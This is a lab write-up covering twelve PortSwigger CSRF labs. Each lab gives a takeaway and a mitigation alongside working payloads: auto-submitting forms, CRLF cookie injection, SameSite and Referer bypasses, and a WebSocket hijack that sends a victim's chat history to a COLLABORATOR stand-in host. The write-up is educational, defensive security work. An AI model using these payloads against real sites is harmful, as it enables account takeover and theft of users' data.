# CSRF (Cross-Site Request Forgery) — Lab Write-ups

> **Topic:** Cross-Site Request Forgery (CSRF)  
> **Platform:** PortSwigger Web Security Academy  
> **Labs Completed:** All (Apprentice + Practitioner)  
> **Tools Used:** Burp Suite (Proxy, Repeater, CSRF PoC Generator), Exploit Server

---

## What is CSRF?

CSRF tricks a victim's browser into making an authenticated request to a target application without the victim's knowledge. The browser automatically includes session cookies with every request — so if an attacker can get the victim to load a malicious page, that page can silently issue requests to any site the victim is logged into.

The impact is whatever the authenticated user can do: changing email addresses, transferring money, changing passwords, deleting accounts. CSRF attacks don't steal data (usually) — they perform actions. The defences are well-known (CSRF tokens, SameSite cookies, origin checks) but they're still regularly implemented incorrectly, which is exactly what these labs explore.

---

## Lab 1 — CSRF Vulnerability with No Defenses

**Level:** Apprentice

**What the lab is about:**  
The email change function has no CSRF protection at all — no token, no origin check, nothing. Any page can make the victim change their email.

**What I did:**  
Logged in and changed my email. Captured the POST request to `/my-account/change-email`. Used Burp's "Generate CSRF PoC" feature (right-click → Engagement tools → Generate CSRF PoC). Got an auto-submitting HTML form:

```html
<form action="https://TARGET/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <script>document.forms[0].submit();</script>
</form>
```

Hosted it on the exploit server. Delivered to victim. Their email was changed.

**Key takeaway:**  
Without any CSRF protection, the browser's automatic cookie attachment is enough for a full attack. This is the baseline that all CSRF defences are trying to prevent.

**Mitigation:**  
Implement CSRF tokens (unpredictable, tied to the session, validated server-side). Enable `SameSite=Strict` or `SameSite=Lax` on session cookies.

---

## Lab 2 — CSRF Where Token Validation Depends on Request Method

**Level:** Practitioner

**What the lab is about:**  
There is a CSRF token — but the validation only happens on POST requests. If you change the method to GET, the token check is skipped entirely.

**What I did:**  
Changed the email change request from POST to GET, moving the parameters to the query string. Removed the CSRF token entirely. Request went through successfully. Built the exploit:

```html
<img src="https://TARGET/my-account/change-email?email=attacker@evil.com&submit=1">
```

Loading the image tag silently triggered the GET request as the victim.

**Key takeaway:**  
CSRF token validation must be enforced on all methods. An endpoint that accepts GET for state-changing operations is especially dangerous because GET can be triggered silently via `<img>`, `<script>`, or `<iframe>` src attributes.

**Mitigation:**  
Validate CSRF tokens regardless of HTTP method. Don't allow state-changing actions via GET requests.

---

## Lab 3 — CSRF Where Token Validation Depends on Token Being Present

**Level:** Practitioner

**What the lab is about:**  
The server validates the CSRF token if it's present in the request. But if you omit the token parameter entirely, the validation is skipped.

**What I did:**  
Intercepted the email change request. Deleted the `csrf` parameter from the body (not just emptied it — removed the key entirely). Forwarded. Request succeeded.

Built a CSRF PoC that simply didn't include the CSRF token field:

```html
<form action="https://TARGET/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <script>document.forms[0].submit();</script>
</form>
```

**Key takeaway:**  
Conditional validation is broken validation. The check should be: "Is this a state-changing request? Then a valid token is mandatory." Not "Is a token present? Then validate it."

**Mitigation:**  
Make CSRF token validation unconditional. A missing token must be treated the same as an invalid token — reject the request.

---

## Lab 4 — CSRF Where Token Is Not Tied to User Session

**Level:** Practitioner

**What the lab is about:**  
The CSRF token exists and is validated — but there's a shared pool of valid tokens that aren't tied to specific sessions. You can take your own valid token and use it in an attack against any victim.

**What I did:**  
Logged in as attacker. Got a valid CSRF token from my session. Embedded it in a CSRF PoC targeting the victim:

```html
<form action="https://TARGET/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="MY_VALID_TOKEN">
  <script>document.forms[0].submit();</script>
</form>
```

The server accepted my token as valid — it checked existence in the pool but not session binding. Victim's email changed.

**Key takeaway:**  
CSRF tokens must be tied to the user's specific session. A token that's valid for any session is barely better than no token at all — an attacker just uses their own.

**Mitigation:**  
Generate tokens server-side and bind them to the user's session. Validate that the submitted token matches the one stored for that specific session.

---

## Lab 5 — CSRF Where Token Is Tied to Non-Session Cookie

**Level:** Practitioner

**What the lab is about:**  
The CSRF token is validated against a separate `csrfKey` cookie, not the session cookie. An attacker who can inject cookies (via a CRLF injection or another vulnerability) can set their own `csrfKey` and use their own token.

**What I did:**  
The application had a search function that reflected a cookie back in the response header — injectable via CRLF. Used this to inject my `csrfKey` cookie into the victim's browser:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=MY_CSRF_KEY%3b%20SameSite=None
```

Then delivered a CSRF PoC using my known valid CSRF token (which matches my `csrfKey`). Since I injected my `csrfKey` into the victim's browser, the validation passed — server saw matching token + csrfKey pair.

**Key takeaway:**  
Cookie injection vulnerabilities chain perfectly with weak CSRF implementations. If CSRF validation is based on cookie-token matching rather than session-token matching, cookie injection completely undermines it.

**Mitigation:**  
CSRF tokens must be tied to the server-side session, not to another client-controlled cookie. Any CRLF injection vulnerability in the application also needs fixing independently.

---

## Lab 6 — CSRF Where Token Is Duplicated in Cookie

**Level:** Practitioner

**What the lab is about:**  
The "double submit cookie" pattern is used — the CSRF token appears in both the cookie and the request body, and the server just checks they match. An attacker who can set cookies can set both to the same value.

**What I did:**  
Used the same cookie injection vector as Lab 5. Set both the `csrf` cookie and the `csrf` body parameter to an arbitrary matching value:

```
csrf=arbitrary123 (cookie, injected)
csrf=arbitrary123 (body parameter)
```

Server saw: cookie == body parameter → valid. Attack succeeded.

**Key takeaway:**  
Double-submit cookies are weak if the attacker can control cookies. The pattern only works if cookie injection is impossible — which is a big assumption. Tied-to-session tokens are always stronger.

**Mitigation:**  
Prefer session-bound CSRF tokens over double-submit cookies. If using double-submit, ensure HTTPS is enforced and subdomain cookie injection is not possible.

---

## Lab 7 — SameSite Lax Bypass via Method Override

**Level:** Practitioner

**What the lab is about:**  
The session cookie uses `SameSite=Lax`, which blocks cross-site POST requests. But the application supports method override via `_method` parameter — GET requests with `_method=POST` are treated as POST by the server.

**What I did:**  
Built an exploit using a GET request with method override:

```html
<script>
  document.location = "https://TARGET/my-account/change-email?email=attacker@evil.com&_method=POST";
</script>
```

Because it's a top-level navigation GET request, `SameSite=Lax` allows the cookie to be sent. The `_method=POST` override made the server process it as POST. Email changed.

**Key takeaway:**  
`SameSite=Lax` allows cookies on top-level GET navigations. Any endpoint that processes GET as a state-changing request (via method overrides or otherwise) breaks this protection.

**Mitigation:**  
Don't support method overrides. Use `SameSite=Strict` for even stronger protection. Never perform state changes on GET requests.

---

## Lab 8 — SameSite Lax Bypass via Cookie Refresh

**Level:** Practitioner

**What the lab is about:**  
`SameSite=Lax` has a two-minute exception window — new cookies set via top-level navigations are sent on cross-site POST requests for 120 seconds. This exists to support OAuth flows. An attacker can exploit this by forcing the victim to refresh their session cookie right before launching the CSRF attack.

**What I did:**  
First, opened a pop-up to the target site's OAuth login endpoint to force a fresh cookie issuance. Then, after a brief pause to ensure the cookie was refreshed, submitted the CSRF POST within the 2-minute window:

```javascript
window.open('https://TARGET/social-login');
setTimeout(() => {
  document.forms[0].submit();
}, 5000);
```

Because the cookie was freshly issued via a top-level navigation, the browser sent it with the cross-site POST.

**Key takeaway:**  
The `SameSite=Lax` 2-minute cookie refresh exception is a real bypass vector. Any application relying solely on `SameSite=Lax` for CSRF protection is vulnerable if this window can be triggered.

**Mitigation:**  
Layer defences: use `SameSite=Strict` where possible, and combine with server-side CSRF tokens. Don't rely on a single mechanism.

---

## Lab 9 — SameSite Strict Bypass via Client-Side Redirect

**Level:** Practitioner

**What the lab is about:**  
`SameSite=Strict` should block all cross-site cookie attachment. However, the target application has an open redirect / client-side redirect vulnerability. The attacker can make the victim visit the same site, which then redirects to the target page — and because it's now a same-site request, the cookie is sent.

**What I did:**  
Found that the blog comment submission redirects to `/post/comment/confirmation?postId=X` and then client-side JS redirects to `/post/X`. Manipulated `postId` to be a path:

```
postId=1/../../my-account/change-email?email=attacker@evil.com
```

The client-side redirect built a URL from this value and navigated to it within the same origin — making it a same-site request. Full `SameSite=Strict` cookie was attached.

**Key takeaway:**  
`SameSite` is a cookie attribute — it protects cross-site navigation, not same-site navigation. Any open redirect or client-side path manipulation within the target origin can bypass it. Defence-in-depth matters.

**Mitigation:**  
Fix the redirect vulnerability (validate and whitelist redirect targets). Combine `SameSite` with server-side CSRF tokens.

---

## Lab 10 — CSRF via Sibling Domain (CORS + WebSocket)

**Level:** Practitioner

**What the lab is about:**  
A WebSocket-based chat application trusts requests from sibling subdomains (same registrable domain). A sibling subdomain is vulnerable to XSS. Chain them: XSS on sibling → cross-site WebSocket message → extract victim's chat history.

**What I did:**  
Found XSS on `cms.TARGET.com`. Used it to open a WebSocket connection to the main chat app (which trusted `*.TARGET.com`). Sent a READY message to fetch chat history:

```javascript
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = (e) => fetch('https://COLLABORATOR/?d=' + btoa(e.data));
```

The WebSocket handshake went through because the origin was a trusted sibling. Exfiltrated chat history containing credentials.

**Key takeaway:**  
Cross-site WebSocket hijacking (CSWSH) is CSRF for WebSockets. Origin validation on WebSocket connections must be strict — trusting `*.domain.com` means every subdomain is a potential attack surface.

**Mitigation:**  
Validate WebSocket origin strictly against a hardcoded list. Fix XSS on all subdomains — a subdomain XSS can pivot to the main application.

---

## Lab 11 — CSRF Where Referer Must Be Present

**Level:** Practitioner

**What the lab is about:**  
The application validates the `Referer` header only if it's present — if it's absent, the request is allowed. You can suppress the Referer header from a cross-site request.

**What I did:**  
Added a `<meta>` tag to the exploit page to suppress the Referer header:

```html
<meta name="referrer" content="never">
<form action="https://TARGET/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <script>document.forms[0].submit();</script>
</form>
```

No Referer header was sent. Server skipped validation and processed the request.

**Key takeaway:**  
Referer-based CSRF protection that allows absent Referers is useless — an attacker can always suppress the header. The validation must require a valid Referer, not just check it if present.

**Mitigation:**  
Reject requests with no Referer (or no valid Origin) in addition to rejecting bad ones. Prefer CSRF tokens over Referer-based checks.

---

## Lab 12 — CSRF with Broken Referer Validation

**Level:** Practitioner

**What the lab is about:**  
The server validates that the Referer header contains the target domain — but does a substring check, not a proper origin check. You can craft a URL where the target domain appears as a subdomain or path of your own domain.

**What I did:**  
The check was: does `Referer` contain `TARGET.com`? Set my exploit server URL to:

```
https://TARGET.com.evil-server.com/exploit
```

Or alternatively, added the target as a query parameter:

```
https://evil-server.com/exploit?TARGET.com
```

Either way, the substring check matched and the request was allowed.

**Key takeaway:**  
String matching on Referer is dangerous. Always use proper URL parsing and check that the `Referer` hostname exactly matches the expected origin — not just contains it somewhere in the string.

**Mitigation:**  
Use proper URL parsing. Check `Referer` hostname exactly. Better: use CSRF tokens and don't rely on Referer at all.

---

*CSRF is one of those vulnerabilities where the defences look simple on paper but are consistently broken in subtle ways in practice. Working through these labs really drives home that no single defence is enough — layering CSRF tokens, SameSite cookies, and origin validation together is the correct approach.*
